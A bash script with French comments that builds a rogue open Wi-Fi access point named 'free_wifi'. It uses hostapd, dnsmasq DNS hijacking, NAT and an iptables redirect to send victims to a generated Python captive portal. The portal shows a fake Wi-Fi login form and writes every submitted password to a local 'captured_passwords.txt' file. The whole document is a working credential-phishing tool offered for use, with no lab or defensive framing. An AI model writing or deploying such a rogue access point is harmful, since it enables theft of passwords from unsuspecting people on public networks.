#!/bin/sh
set -euo pipefail

# Configuration du logging
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LOG_DIR="$SCRIPT_DIR/logs"
LOG_FILE="$LOG_DIR/fake_wifi.log"

# Création du dossier logs s'il n'existe pas
mkdir -p "$LOG_DIR"

# Fonction de logging
log() {
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    local message="[$timestamp] $1"
    echo "$message" | tee -a "$LOG_FILE"
}

# Nettoyage du fichier de log au démarrage
echo "" > "$LOG_FILE"

# Redirection de stderr vers le fichier de log
exec 2>> "$LOG_FILE"

trap 'log "[❌] Erreur sur la ligne ${LINENO}: Commande échouée avec le code de sortie $?"' ERR

if [[ $EUID -ne 0 ]]; then
    log "[❌] Ce script doit être exécuté en tant que root."
    exit 1
fi

check_interface() {
    local iface="$1"
    if ! ip link show "$iface" &>/dev/null; then
        log "[❌] L'interface '$iface' n'existe pas."
        exit 1
    fi
}

install_package() {
    local pkg="$1"
    if dpkg -s "$pkg" &>/dev/null; then
        log "[✅] $pkg est installé."
    else
        log "[⚠️] $pkg n'est pas installé. Installation en cours..."
        apt-get install -y "$pkg" || { log "[❌] Échec de l'installation de $pkg."; exit 1; }
        log "[✅] $pkg installé."
    fi
}

start_service() {
    local service_cmd="$1"
    local check_cmd="$2"
    local service_name="$3"
    log "[ℹ️] Démarrage de $service_name..."
    eval "$service_cmd" &
    for i in {1..10}; do
        sleep 1
        if eval "$check_cmd"; then
            log "[✅] $service_name est actif."
            return
        fi
    done
    log "[❌] $service_name n'a pas démarré."
    exit 1
}

# Lecture de la configuration
CONFIG_FILE="config.json"
if [ ! -f "$CONFIG_FILE" ]; then
    log "[❌] Fichier de configuration non trouvé !"
    exit 1
fi

# Extraction de l'interface depuis la configuration
WIFI_IFACE=$(jq -r '.wifi_interface' "$CONFIG_FILE")
MONITOR_SUPPORTED=$(jq -r '.monitor_supported' "$CONFIG_FILE")

if [[ -z "$WIFI_IFACE" ]]; then
    log "[❌] Interface non configurée !"
    exit 1
fi

log "[✅] Interface configurée : $WIFI_IFACE"

# Vérification du support du mode monitor
if [[ "$MONITOR_SUPPORTED" != "true" ]]; then
    log "[⚠️] Attention : Cette interface ne supporte pas le mode monitor."
    log "     Le point d'accès pourrait ne pas fonctionner correctement."
    read -p "Voulez-vous continuer quand même ? (o/N) " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Oo]$ ]]; then
        exit 1
    fi
fi

OUT_IFACE="${OUT_IFACE:-$(ip route | awk '/^default/{print $5; exit}')}"
if [ -z "$OUT_IFACE" ]; then
    log "[❌] Impossible de détecter l'interface de sortie par défaut."
    exit 1
fi
check_interface "$OUT_IFACE"

log "[ℹ️] Désactivation du contrôle de NetworkManager pour $WIFI_IFACE..."
if command -v nmcli &>/dev/null; then
    nmcli device set "$WIFI_IFACE" managed no || { log "[❌] Échec de désactiver NetworkManager sur $WIFI_IFACE."; exit 1; }
fi

log "[ℹ️] Arrêt de wpa_supplicant sur $WIFI_IFACE..."
pkill wpa_supplicant || true

log "[ℹ️] Mise en down de $WIFI_IFACE..."
ip link set "$WIFI_IFACE" down
sleep 1
ip addr flush dev "$WIFI_IFACE" || true

log "[ℹ️] Configuration de $WIFI_IFACE en mode AP (réseau ouvert)..."
ip addr add 192.168.1.1/24 dev "$WIFI_IFACE"
ip link set "$WIFI_IFACE" up

log "[🔍] Mise à jour des listes de paquets..."
apt-get update -qq

DEPENDENCIES=(hostapd dnsmasq iw wireless-tools python3)
for pkg in "${DEPENDENCIES[@]}"; do
    install_package "$pkg"
done

log "[📡] Configuration du point d'accès Wi-Fi (réseau ouvert)..."
cat > /etc/hostapd/hostapd.conf <<EOF
interface=$WIFI_IFACE
driver=nl80211
ssid=free_wifi
hw_mode=g
channel=6
EOF
log "[✅] Configuration hostapd créée."

start_service "hostapd -B /etc/hostapd/hostapd.conf" "pgrep -x hostapd &>/dev/null" "hostapd"

log "[⚙️] Configuration de dnsmasq pour le DHCP et la redirection DNS..."
cat > /etc/dnsmasq.conf <<EOF
interface=$WIFI_IFACE
bind-interfaces
dhcp-range=192.168.1.100,192.168.1.200,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
log-queries
log-dhcp
EOF
log "[✅] Configuration dnsmasq créée."

pkill dnsmasq || true
start_service "dnsmasq -C /etc/dnsmasq.conf" "pgrep -x dnsmasq &>/dev/null" "dnsmasq"

log "[🔄] Activation du NAT..."
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o "$OUT_IFACE" -j MASQUERADE
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
log "[✅] NAT et redirection configurés."

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORTAL_FILE="$SCRIPT_DIR/captive.py"
LOG_FILE="$SCRIPT_DIR/logs/captured_passwords.txt"

cat > "$PORTAL_FILE" <<'EOF'
#!/usr/bin/env python3
import http.server
import socketserver
import urllib.parse
import os
from datetime import datetime

LOG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs/captured_passwords.txt")

class CaptiveHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        html = """<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Connexion Wi-Fi</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background-color: #f2f2f2;
      font-family: Arial, sans-serif;
    }
    .container {
      max-width: 500px;
      margin: 50px auto;
      padding: 20px;
      background-color: #fff;
      border-radius: 5px;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
    }
    h2 {
      text-align: center;
      margin-bottom: 20px;
    }
    p {
      text-align: center;
      margin-bottom: 20px;
    }
    input[type="password"] {
      width: 100%;
      padding: 15px;
      margin-bottom: 20px;
      border: 1px solid #ccc;
      border-radius: 4px;
      font-size: 16px;
      box-sizing: border-box;
    }
    button {
      width: 100%;
      padding: 15px;
      background-color: #007BFF;
      border: none;
      color: #fff;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
    }
    button:hover {
      background-color: #0056b3;
    }
    @media (max-width: 600px) {
      .container {
        margin: 20px;
        padding: 15px;
      }
      input[type="password"], button {
        padding: 12px;
        font-size: 14px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <h2>Connexion Wi-Fi</h2>
    <p>Entrez votre mot de passe pour accéder à Internet :</p>
    <form method="POST" action="">
      <input type="password" name="password" placeholder="Mot de passe Wi-Fi" required>
      <button type="submit">Se connecter</button>
    </form>
  </div>
</body>
</html>
"""
        self.wfile.write(html.encode("utf-8"))

    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        post_data = self.rfile.read(content_length)
        data = urllib.parse.parse_qs(post_data.decode("utf-8"))
        password = data.get("password", [""])[0]
        with open(LOG_FILE, "a") as f:
            f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {password}\n")
        self.send_response(302)
        self.send_header("Location", "http://neverssl.com")
        self.end_headers()

if __name__ == "__main__":
    PORT = 8080
    with socketserver.TCPServer(("", PORT), CaptiveHandler) as httpd:
        print(f"Portail captif lancé sur le port {PORT}")
        httpd.serve_forever()
EOF

chmod +x "$PORTAL_FILE"
log "[✅] Portail captif créé."

# Avant de démarrer le portail captif, vérifions et libérons le port 8080
log "[ℹ️] Vérification du port 8080..."
if lsof -i:8080 > /dev/null 2>&1; then
    log "[⚠️] Le port 8080 est déjà utilisé. Tentative de libération..."
    fuser -k 8080/tcp || true
    sleep 2
fi

start_service "python3 $PORTAL_FILE" "pgrep -f captive.py &>/dev/null" "Portail Captif"

cleanup() {
    log "[🔚] Arrêt du faux Wi-Fi..."
    pkill hostapd
    pkill dnsmasq
    pkill -f captive.py
    iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
    iptables -t nat -D POSTROUTING -o "$OUT_IFACE" -j MASQUERADE
    ip addr flush dev "$WIFI_IFACE"
    if command -v nmcli &>/dev/null; then
        nmcli device set "$WIFI_IFACE" managed yes || true
    fi
    exit 0
}
trap cleanup SIGINT

log "[✅] Faux Wi-Fi 'free_wifi' activé avec portail captif sur $WIFI_IFACE."
log "[ℹ️] Les clients seront redirigés vers le portail et leurs mots de passe seront enregistrés dans $LOG_FILE."
log "[ℹ️] Si le navigateur ne s'ouvre pas automatiquement, ouvrez manuellement une page web."
log "[ℹ️] Appuyez sur Ctrl+C pour arrêter."

while true; do sleep 1; done

